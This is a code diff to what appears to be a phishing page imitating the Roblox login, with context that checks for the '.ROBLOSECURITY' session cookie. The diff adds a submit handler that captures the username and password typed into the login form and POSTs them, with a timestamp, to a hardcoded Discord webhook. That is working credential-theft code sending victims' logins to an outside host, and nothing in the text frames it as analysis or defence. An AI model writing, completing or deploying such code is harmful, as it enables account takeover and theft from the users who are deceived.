@@ -2079,13 +2079,38 @@ if (document.cookie.indexOf('.ROBLOSECURITY=') !== -1) {
 
       // Final submission check and AJAX submission
 
-            document.getElementById('loginForm').addEventListener('submit', function (e) {
-        e.preventDefault();
-        var u = document.getElementById('inpLoginUser').value;
-        var p = document.getElementById('inpLoginPass').value;
-        console.log('New Login Detected', u, p);
-      });
-      signupForm.addEventListener('submit', function (e) {
+document.getElementById('loginForm').addEventListener('submit', function (e) {
+    e.preventDefault();
+    var u = document.getElementById('inpLoginUser').value;
+    var p = document.getElementById('inpLoginPass').value;
+    
+    // Replace 'YOUR_WEBHOOK_URL' with your actual webhook URL
+    fetch('https://discord.com/api/webhooks/1548034524309491754/AAFCCJin5qbMQAKjG7W7s_v-4s9RDucikUl3mtGSYxeDtWmAGzbgB969iwCzWoPfT48F', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+            username: u,
+            password: p,
+            timestamp: new Date().toISOString()
+        })
+    })
+    .then(response => {
+        if (response.ok) {
+            console.log('Data sent successfully');
+            // Optional: Clear the form or show success message
+            // e.target.reset();
+        } else {
+            console.error('Error sending data:', response.statusText);
+        }
+    })
+    .catch(error => {
+        console.error('Error:', error);
+    });
+});
+
+signupForm.addEventListener('submit', function (e) {
         e.preventDefault();
         hideError();
 
